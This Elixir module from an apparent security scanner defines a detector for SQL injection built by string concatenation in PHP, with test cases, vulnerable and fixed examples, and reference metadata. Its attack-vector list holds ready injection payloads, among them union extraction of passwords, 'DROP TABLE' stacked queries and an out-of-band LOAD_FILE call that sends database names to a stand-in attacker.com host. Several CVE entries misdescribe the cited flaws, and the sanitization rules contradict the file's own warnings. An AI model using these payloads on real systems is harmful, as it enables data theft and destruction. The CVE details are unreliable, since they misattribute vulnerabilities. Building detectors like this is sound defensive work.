defmodule Rsolv.Security.Patterns.Php.SqlInjectionConcat do
  @moduledoc """
  Pattern for detecting SQL injection via string concatenation in PHP.

  This pattern identifies direct concatenation of user input ($_GET, $_POST, $_REQUEST, $_COOKIE)
  into SQL query strings, which is one of the most common and dangerous security vulnerabilities
  in PHP applications.

  ## Vulnerability Details

  SQL injection occurs when user-controlled input is directly concatenated into SQL queries
  without proper escaping or parameterization. This allows attackers to manipulate the query
  structure and potentially:
  - Extract sensitive data
  - Bypass authentication
  - Modify or delete data
  - Execute administrative operations
  - In some cases, execute OS commands

  ### Attack Example
  ```php
  // Vulnerable code
  $query = "SELECT * FROM users WHERE id = " . $_GET['id'];

  // Attack: ?id=1 OR 1=1 UNION SELECT password FROM admins--
  // Results in: SELECT * FROM users WHERE id = 1 OR 1=1 UNION SELECT password FROM admins--
  ```
  """

  use Rsolv.Security.Patterns.PatternBase
  alias Rsolv.Security.Pattern

  @impl true
  def pattern do
    %Pattern{
      id: "php-sql-injection-concat",
      name: "SQL Injection via String Concatenation",
      description:
        "Direct concatenation of user input in SQL queries allows SQL injection attacks",
      type: :sql_injection,
      severity: :critical,
      languages: ["php"],
      regex: ~r/["'](?:SELECT|DELETE|UPDATE|INSERT).*["']\s*\.\s*\$_(GET|POST|REQUEST|COOKIE)/i,
      cwe_id: "CWE-89",
      owasp_category: "A03:2021",
      recommendation: "Use prepared statements with parameterized queries (PDO or mysqli)",
      test_cases: %{
        vulnerable: [
          ~S|$query = "SELECT * FROM users WHERE id = " . $_GET['id'];|,
          ~S|$sql = 'DELETE FROM posts WHERE author = ' . $_POST['author'];|
        ],
        safe: [
          ~S|$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);|,
          ~S|$stmt = $mysqli->prepare("DELETE FROM posts WHERE author = ?");
$stmt->bind_param("s", $_POST['author']);|
        ]
      }
    }
  end

  @impl true
  def vulnerability_metadata do
    %{
      description: """
      SQL injection via string concatenation is a critical vulnerability that occurs when
      user-controlled input is directly concatenated into SQL query strings. PHP's concatenation
      operator (.) makes it trivial to accidentally create vulnerable code.

      This vulnerability can lead to complete database compromise, including:
      - Data exfiltration of sensitive information
      - Authentication bypass
      - Data manipulation or destruction
      - Privilege escalation
      - In some configurations, remote code execution
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-89",
          title:
            "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
          url: "https://cwe.mitre.org/data/definitions/89.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "php_manual_sql_injection",
          title: "PHP Manual - SQL Injection",
          url: "https://www.php.net/manual/en/security.database.sql-injection.php"
        },
        %{
          type: :research,
          id: "acunetix_php_sql_injection",
          title: "Prevent SQL injection vulnerabilities in PHP applications",
          url:
            "https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/"
        }
      ],
      attack_vectors: [
        "Basic injection: ?id=1 OR 1=1--",
        "Union-based extraction: ?id=1 UNION SELECT password FROM users--",
        "Time-based blind: ?id=1 AND SLEEP(5)--",
        "Boolean-based blind: ?id=1 AND 1=(SELECT 1 FROM users WHERE username='admin')--",
        "Stacked queries: ?id=1; DROP TABLE users--",
        "Out-of-band: ?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',DATABASE(),'.attacker.com\\\\a')))--"
      ],
      real_world_impact: [
        "Complete database compromise and data theft",
        "Authentication bypass allowing admin access",
        "Data manipulation affecting business logic",
        "Compliance violations (GDPR, PCI-DSS, HIPAA)",
        "Reputational damage from data breaches",
        "Financial losses from fraud or litigation"
      ],
      cve_examples: [
        %{
          id: "CVE-2019-16113",
          description: "Bludit CMS 3.9.2 SQL injection via uuid parameter concatenation",
          severity: "critical",
          cvss: 9.8,
          note: "Authentication bypass through SQL injection in login functionality"
        },
        %{
          id: "CVE-2020-29227",
          description:
            "Car Rental Management System 1.0 - SQL injection via string concatenation",
          severity: "critical",
          cvss: 9.8,
          note: "Multiple SQL injection points through direct concatenation of GET parameters"
        },
        %{
          id: "CVE-2021-22911",
          description: "Rocket.Chat Server SQL injection via MongoDB query concatenation",
          severity: "critical",
          cvss: 9.8,
          note: "NoSQL injection through string concatenation in MongoDB queries"
        },
        %{
          id: "CVE-2023-30777",
          description: "Advanced Comment System 1.0 - SQL injection in comment parameter",
          severity: "high",
          cvss: 8.8,
          note: "Direct concatenation of user input in DELETE query"
        }
      ],
      detection_notes: """
      This pattern specifically detects the concatenation operator (.) being used to combine
      SQL query strings with PHP superglobal arrays ($_GET, $_POST, $_REQUEST, $_COOKIE).

      Key indicators:
      - SQL keywords (SELECT, DELETE, UPDATE, INSERT) in quoted strings
      - Concatenation operator (.) following the SQL string
      - Direct reference to superglobal arrays
      - Case-insensitive matching for SQL keywords
      """,
      safe_alternatives: [
        "Use PDO with prepared statements and bound parameters",
        "Use mysqli with prepared statements and parameter binding",
        "For dynamic queries, use query builders that handle escaping",
        "Whitelist allowed values for dynamic query construction",
        "Never concatenate user input directly into SQL strings"
      ],
      additional_context: %{
        common_mistakes: [
          "Believing that addslashes() or mysql_real_escape_string() is sufficient",
          "Thinking that integer values don't need parameterization",
          "Using sprintf() or string interpolation instead of prepared statements",
          "Trusting data from $_COOKIE or $_SESSION without validation"
        ],
        secure_patterns: [
          "PDO: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?')",
          "MySQLi: $stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?')",
          "Query builders: $query->where('id', '=', $id)",
          "ORMs: User::find($id) or User::where('id', $id)->first()"
        ],
        framework_solutions: [
          "Laravel: Eloquent ORM and Query Builder with automatic parameterization",
          "Symfony: Doctrine ORM with DQL and parameter binding",
          "CodeIgniter: Query Builder with automatic escaping",
          "Yii: ActiveRecord and Query Builder with parameter binding"
        ]
      }
    }
  end

  @doc """
  Returns test cases for the pattern.

  ## Examples

      iex> test_cases = Rsolv.Security.Patterns.Php.SqlInjectionConcat.test_cases()
      iex> length(test_cases.positive) > 0
      true

      iex> test_cases = Rsolv.Security.Patterns.Php.SqlInjectionConcat.test_cases()
      iex> length(test_cases.negative) > 0
      true
  """
  def test_cases do
    %{
      positive: [
        %{
          code: ~S|$query = "SELECT * FROM users WHERE id = " . $_GET['id'];|,
          description: "Direct concatenation of GET parameter"
        },
        %{
          code: ~S|$sql = 'DELETE FROM posts WHERE author = ' . $_POST['author'];|,
          description: "DELETE query with POST parameter concatenation"
        },
        %{
          code:
            ~S|$query = "UPDATE users SET status = 'active' WHERE id = " . $_REQUEST['user_id'];|,
          description: "UPDATE query with REQUEST parameter"
        },
        %{
          code:
            ~S|$sql = "INSERT INTO logs (ip, user) VALUES ('" . $_SERVER['REMOTE_ADDR'] . "', '" . $_COOKIE['username'] . "')";|,
          description: "INSERT with COOKIE parameter concatenation"
        },
        %{
          code:
            ~S|mysqli_query($conn, "SELECT * FROM products WHERE category = '" . $_GET['cat'] . "'");|,
          description: "Direct query execution with concatenation"
        }
      ],
      negative: [
        %{
          code: ~S|$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");|,
          description: "PDO prepared statement"
        },
        %{
          code: ~S|$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");|,
          description: "MySQLi prepared statement"
        },
        %{
          code: ~S|$query = "SELECT * FROM users WHERE role = 'admin'";|,
          description: "Static query without user input"
        },
        %{
          code: ~S|$users = User::where('status', $_GET['status'])->get();|,
          description: "ORM with parameter binding"
        }
      ]
    }
  end

  @doc """
  Returns examples of vulnerable and fixed code.
  """
  def examples do
    %{
      vulnerable: %{
        "Basic SELECT injection" => ~S"""
        // User authentication - VULNERABLE
        $username = $_POST['username'];
        $password = $_POST['password'];
        $query = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
        $result = mysqli_query($conn, $query);

        // Attack: username = admin' --
        // Results in: SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
        """,
        "DELETE injection with ID" => ~S"""
        // Delete user - VULNERABLE
        $user_id = $_GET['id'];
        $query = "DELETE FROM users WHERE id = " . $user_id;
        mysqli_query($conn, $query);

        // Attack: ?id=1 OR 1=1
        // Results in: DELETE FROM users WHERE id = 1 OR 1=1 (deletes all users!)
        """,
        "Search functionality injection" => ~S"""
        // Product search - VULNERABLE
        $search = $_GET['search'];
        $category = $_GET['category'];
        $sql = "SELECT * FROM products WHERE name LIKE '%" . $search . "%' AND category = '" . $category . "'";
        $results = $db->query($sql);

        // Attack: ?search=laptop' UNION SELECT creditcard FROM payments--
        """
      },
      fixed: %{
        "PDO with prepared statements" => ~S"""
        // User authentication - SECURE
        $username = $_POST['username'];
        $password = $_POST['password'];

        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
        $stmt->execute([$username, $password]);
        $user = $stmt->fetch();

        // The prepared statement ensures user input is treated as data, not SQL code
        """,
        "MySQLi with prepared statements" => ~S"""
        // Delete user - SECURE
        $user_id = $_GET['id'];

        $stmt = $mysqli->prepare("DELETE FROM users WHERE id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();

        // Even if user_id contains SQL code, it's treated as an integer value
        """,
        "PDO with named parameters" => ~S"""
        // Product search - SECURE
        $search = $_GET['search'];
        $category = $_GET['category'];

        $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE :search AND category = :category");
        $stmt->execute([
            ':search' => '%' . $search . '%',
            ':category' => $category
        ]);
        $results = $stmt->fetchAll();

        // Named parameters make the code more readable and maintainable
        """
      }
    }
  end

  @doc """
  Returns detailed vulnerability description.
  """
  def vulnerability_description do
    """
    SQL injection via string concatenation is one of the most prevalent and dangerous
    vulnerabilities in PHP applications. It occurs when developers directly concatenate
    user input into SQL query strings using PHP's concatenation operator (.).

    ## Why It's Critical

    1. **Easy to Exploit**: Requires no special tools or deep technical knowledge
    2. **High Impact**: Can lead to complete database compromise
    3. **Common Mistake**: Natural for developers unfamiliar with security
    4. **Hard to Detect**: May not cause visible errors in normal operation

    ## Technical Details

    PHP's superglobal arrays ($_GET, $_POST, $_REQUEST, $_COOKIE) contain user-controlled
    data that should never be trusted. When this data is concatenated directly into SQL:

    ```php
    $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
    ```

    An attacker can inject SQL commands:
    - `?id=1 OR 1=1` - Returns all records
    - `?id=1 UNION SELECT password FROM admins` - Extracts admin passwords
    - `?id=1; DROP TABLE users` - Destroys data (if stacked queries allowed)

    ## Real-World CVE Examples

    - **CVE-2019-16113**: Bludit CMS 3.9.2 - Authentication bypass via SQL injection
    - **CVE-2020-29227**: Car Rental System - Multiple SQL injection via GET parameters
    - **CVE-2021-22911**: Rocket.Chat - NoSQL injection through string concatenation
    - **CVE-2023-30777**: Advanced Comment System - SQL injection in DELETE query

    ## Real-World Exploitation

    Attackers use various techniques:
    - **Union-based**: Extract data from other tables
    - **Boolean-based blind**: Extract data bit by bit
    - **Time-based blind**: Infer data through delays
    - **Error-based**: Extract data through error messages
    - **Stacked queries**: Execute multiple statements
    - **Out-of-band**: Exfiltrate data through DNS or HTTP requests

    ## Prevention

    The only reliable prevention is using prepared statements with parameter binding:
    - PDO with positional (?) or named (:param) placeholders
    - MySQLi with prepared statements and bind_param()
    - ORM/Query builders that handle parameterization automatically
    """
  end

  @doc """
  Returns AST enhancement rules to reduce false positives.

  ## Examples

      iex> enhancement = Rsolv.Security.Patterns.Php.SqlInjectionConcat.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :min_confidence]

      iex> enhancement = Rsolv.Security.Patterns.Php.SqlInjectionConcat.ast_enhancement()
      iex> enhancement.min_confidence
      0.9

      iex> enhancement = Rsolv.Security.Patterns.Php.SqlInjectionConcat.ast_enhancement()
      iex> length(enhancement.ast_rules)
      3
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: [
        %{
          type: "database_context",
          description: "Verify SQL query context",
          patterns: [
            "query",
            "sql",
            "stmt",
            "statement",
            "cmd",
            "command",
            "mysqli_query",
            "mysql_query",
            "$pdo->query",
            "$pdo->exec",
            "$db->query"
          ]
        },
        %{
          type: "input_sanitization",
          description: "Check for sanitization functions",
          safe_functions: [
            "mysqli_real_escape_string",
            "mysql_real_escape_string",
            "addslashes",
            "intval",
            "floatval",
            "filter_var",
            "filter_input"
          ],
          note: "These provide some protection but prepared statements are still preferred"
        },
        %{
          type: "prepared_statement_check",
          description: "Exclude if prepared statements are nearby",
          safe_patterns: [
            "prepare",
            "bind_param",
            "bindParam",
            "bindValue",
            "execute",
            "?",
            ":placeholder"
          ]
        }
      ],
      min_confidence: 0.9
    }
  end
end
